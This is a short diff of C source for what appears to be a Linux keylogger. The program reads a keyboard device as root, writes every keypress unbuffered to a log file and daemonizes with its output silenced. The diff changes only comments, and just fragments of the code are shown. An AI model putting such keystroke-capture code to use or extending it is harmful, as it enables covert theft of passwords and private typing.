@@ -21,9 +21,7 @@ typedef struct input_event input_event;
 static void rootCheck();
 static int openKeyboardDeviceFile(char *deviceFile);
 
-/**
- * Exit with return code -1 if user does not have root privileges
- */
+//checking the root privileges
 static void rootCheck() {
    if (geteuid() != 0) {
       printf("Must run as root\n");
@@ -62,11 +60,11 @@ int main(int argc, char **argv) {
       exit(-1);
    }
 
-   // We want to write to the file on every keypress, so disable buffering
+   // disable buffering
    setbuf(logfile, NULL);
 
-   // Daemonize process. Don't change working directory but redirect standard
-   // inputs and outputs to /dev/null
+   
+   // inputs and outputs to /dev/null (nothing happens!)
    if (daemon(1, 0) == -1) {
       LOG_ERROR("%s", strerror(errno));
       exit(-1);
